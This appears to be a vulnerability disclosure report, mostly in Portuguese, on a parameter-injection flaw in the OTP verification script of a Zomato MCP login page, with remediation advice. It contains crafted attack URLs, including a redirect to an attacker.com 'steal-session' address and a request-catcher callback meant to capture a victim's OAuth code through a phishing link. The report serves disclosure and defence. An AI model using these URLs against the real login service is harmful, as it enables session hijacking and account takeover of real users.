# ZO3 — MCP Consent Page URL Parameter Injection via `...queryParams` Spread in verifyOTP

**Título:** All URL Parameters Injected Into POST Body on OTP Verification — Override Attack and Open Redirect  
**Severidade:** MEDIUM (CVSS 6.1)  
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` → **6.1 MEDIUM**  
**CWE:** CWE-235 (Improper Handling of Extra Parameters) / CWE-601 (Open Redirect)  
**Target:** `https://mcp-server.zomato.com/login` (Consent/Login page JavaScript)  
**Status:** Confirmado — código-fonte JavaScript da consent page é **público** (200 OK sem auth)

---

## Summary

A página de autenticação do Zomato MCP (`mcp-server.zomato.com/login`) contém um bug crítico de design no JavaScript cliente: **todos os parâmetros da URL são extraídos via `URLSearchParams` e injetados diretamente no corpo do POST de verificação de OTP** usando o operador spread (`...queryParams`).

Como o spread é aplicado **após** os campos legítimos no objeto, qualquer parâmetro de URL que tenha o mesmo nome (`otp`, `type`, `login_challenge`, `id`) **sobrescreve** o valor configurado pelo código. Isso permite que um atacante:

1. **Sobrescreva o OTP** verificado — potencial bypass de autenticação se o servidor não valida a origem
2. **Sobrescreva `login_challenge`** — manipulação do binding OAuth session → redirect do código de auth
3. **Injete campos adicionais** no POST — mass assignment, parameter pollution
4. **Trigger open redirect** via campos `redirect_uri`/`redirect_url` que o servidor retorna ao cliente

---

## Código Vulnerável (Extraído do Bundle Público)

```javascript
// Código extraído de: https://mcp-server.zomato.com/login
// Servido como HTML com JS inline — acesso público, sem autenticação

class ZomatoLoginManager {

    getApiPath(path) {
        const currentPath = window.location.pathname;
        if (currentPath.startsWith('/staging')) {  // staging path hardcoded em produção!
            return `/staging${path}`;
        }
        return path;
    }

    getLoginChallenge() {
        const urlParams = new URLSearchParams(window.location.search);
        // FALLBACK HARDCODED: 'default_challenge' — session confusion se servidor aceitar
        return urlParams.get('login_challenge') || 'default_challenge';
    }

    async verifyOTP() {
        const urlParams = new URLSearchParams(window.location.search);
        const queryParams = Object.fromEntries(urlParams);  // TODOS os params da URL

        const response = await fetch(this.getApiPath('/verify-otp'), {
            method: 'POST',
            body: JSON.stringify({
                otp: otp,                                              // do input do usuário
                id: inputValue,                                        // do input do usuário
                type: this.isEmailMode ? 'email' : 'phone',           // do estado da UI
                login_challenge: this.loginChallenge,                  // do URL param
                ...queryParams   // ← CRÍTICO: sobrescreve TODOS os campos acima!
            })
        });

        // OPEN REDIRECT: servidor-controlado
        if (result.redirect_uri) {
            this.showSuccessScreen(result.redirect_uri);  // redireciona para URL do servidor
        }
    }

    async sendOTP() {
        const response = await fetch(this.getApiPath('/login'), { ... });

        // OPEN REDIRECT: dois vetores
        if (response.redirected) {
            window.location.href = response.url;  // redirect direto pelo fetch
        }
        if (result.redirect_uri || result.redirect_url) {
            window.location.href = result.redirect_uri || result.redirect_url;  // campo JSON
        }
    }
}
```

---

## Vetores de Ataque

### Vetor 1 — URL Parameter Override de OTP (`otp=000000`)

**URL Maliciosa:**
```
https://mcp-server.zomato.com/login?login_challenge=LEGIT&otp=000000&type=phone
```

**Resultado no POST `/verify-otp`:**
```json
{
    "otp": "OTP_DO_INPUT",        // definido pelo código...
    "id": "PHONE_DO_USUARIO",
    "type": "phone",
    "login_challenge": "LEGIT",
    "otp": "000000",              // ← queryParams SOBRESCREVE (spread depois!)
    "type": "phone",              // redundante nesse caso
    "login_challenge": "LEGIT"    // redundante
}
```

Se o servidor Go/Python processa a **última ocorrência** de `otp` (ou faz merge diferente), o OTP enviado seria `000000` independente do que o usuário recebeu por SMS.

**Precondição:** Atacante precisa induzir a vítima a abrir a URL maliciosa (phishing/redirect) antes de inserir o OTP.

### Vetor 2 — login_challenge Manipulation → OAuth Session Swap

**URL Maliciosa:**
```
https://mcp-server.zomato.com/login?login_challenge=ATTACKER_OAUTH_SESSION_ID
```

O `login_challenge` é o parâmetro que vincula a sessão de autenticação ao cliente OAuth correto. Se um atacante consegue substituir o `login_challenge` pelo ID de sua própria sessão OAuth, o código de autorização gerado após autenticação da vítima é enviado ao `redirect_uri` do cliente do atacante.

**Fluxo:**
1. Atacante inicia OAuth flow → obtém `login_challenge=ATTACKER_CHALLENGE`
2. Envia link ao usuário: `https://mcp-server.zomato.com/login?login_challenge=ATTACKER_CHALLENGE`
3. Usuário autentica normalmente com seu OTP
4. POST `/verify-otp` inclui `login_challenge: "ATTACKER_CHALLENGE"` (sobrescrito pelo spread)
5. Servidor completa auth da sessão do atacante → código de auth vai para `redirect_uri` do atacante

### Vetor 3 — Mass Assignment (Campos Extras no POST)

Campos adicionais injetados via URL que podem explorar lógica do servidor:

```
?_method=PUT&role=admin&is_internal=true&skip_otp=true&debug=1
```

Dependendo do framework backend (Go/Python), campos extras no JSON podem:
- Ser ignorados (comportamento correto)
- Causar comportamento inesperado por mass assignment
- Triggerar features de debug/internal

### Vetor 4 — Open Redirect via sendOTP

```javascript
if (result.redirect_uri || result.redirect_url) {
    window.location.href = result.redirect_uri || result.redirect_url;
}
```

Se um campo `redirect_uri` ou `redirect_url` pode ser injetado via URL param e o servidor o reflete na resposta JSON, a vítima é redirecionada para o site do atacante após o fluxo de login.

```
?redirect_uri=https://attacker.com/steal-session
```

---

## Proof of Concept

### PoC 1 — OTP Field Override Test

Instruções para testar (com sua própria conta Zomato):

1. Abrir link em browser anônimo:
   ```
   https://mcp-server.zomato.com/login?login_challenge=test&otp=000000&type=phone
   ```
2. Inserir seu número de telefone e solicitar OTP
3. Quando o OTP chegar via SMS, **inserir um OTP errado** no campo
4. Clicar em "Verify"
5. Capturar o POST em DevTools → Network
6. Verificar se o corpo do POST contém `"otp": "000000"` (do URL param) ou o OTP incorreto que você digitou

**Se o POST contiver `000000`** → override confirmado → investigar se servidor valida.

### PoC 2 — login_challenge Override Test

```bash
# Iniciar sessão OAuth legítima para obter login_challenge do attacker session
ATTACKER_REDIRECT="https://natnasd-attacker.requestcatcher.com/callback"
# Note o login_challenge na URL de authorize

# Construir URL phishing com esse login_challenge
PHISHING_URL="https://mcp-server.zomato.com/login?login_challenge=ATTACKER_CHALLENGE_ID"

# Se vítima autenticar via esta URL → verificar se request catcher recebe auth code
```

---

## Evidências de Suporte

### 1. Staging Path em Produção
```javascript
getApiPath(path) {
    if (currentPath.startsWith('/staging')) {
        return `/staging${path}`;
    }
    return path;
}
```
Confirmado: `https://mcp-server.zomato.com/staging/mcp` → **401** (não 404) — staging endpoint ativo em produção.

### 2. Hardcoded Fallback Challenge
```javascript
return urlParams.get('login_challenge') || 'default_challenge';
```
Se o servidor aceitar `login_challenge='default_challenge'` como válido → qualquer request com parâmetro ausente pode ser associado a uma sessão "padrão".

### 3. Duplo Open Redirect no sendOTP
```javascript
if (response.redirected) {
    window.location.href = response.url;  // vetor 1
}
if (result.redirect_uri || result.redirect_url) {
    window.location.href = result.redirect_uri || result.redirect_url;  // vetor 2
}
```
Dois pontos independentes onde uma URL de resposta do servidor é seguida sem validação de domínio.

---

## Impact

1. **OTP Bypass** (se confirmado) — autenticação bypassed com OTP pré-definido no URL → login sem SMS válido
2. **Session Hijacking via login_challenge** — token OAuth da vítima capturado pelo atacante
3. **Open Redirect** — phishing de alta fidelidade (domínio legítimo Zomato redireciona para attacker.com)
4. **Mass Assignment** — injeção de parâmetros internos no backend

---

## Remediation

1. **Remover o `...queryParams` spread** — nunca expandir URL params diretamente no corpo de um POST de autenticação
2. **Extrair apenas o `login_challenge`** da URL explicitamente:
   ```javascript
   // CORRETO:
   const loginChallenge = new URLSearchParams(window.location.search).get('login_challenge');
   body: JSON.stringify({ otp, id, type, login_challenge: loginChallenge })
   
   // ERRADO (atual):
   body: JSON.stringify({ otp, id, type, login_challenge, ...queryParams })
   ```
3. **Remover fallback hardcoded** — `'default_challenge'` deve ser inválido no servidor
4. **Validar redirect_uri** antes de `window.location.href` — verificar que o domínio pertence a uma allowlist de clientes registrados Zomato
5. **Remover staging path check** do código de produção

---

## CVSS Breakdown

| Metric | Value | Reason |
|--------|-------|--------|
| Attack Vector | Network | Ataque via URL crafted |
| Attack Complexity | Low | Simples override de parâmetro |
| Privileges Required | None | Nenhuma auth para explorar |
| User Interaction | Required | Vítima deve clicar no link |
| Scope | Changed | Impacto fora do MCP server |
| Confidentiality | Low | Depende do vetor explorado |
| Integrity | Low | Sessão OAuth comprometida |
| Availability | None |  |

**CVSS Base Score: 6.1 MEDIUM**
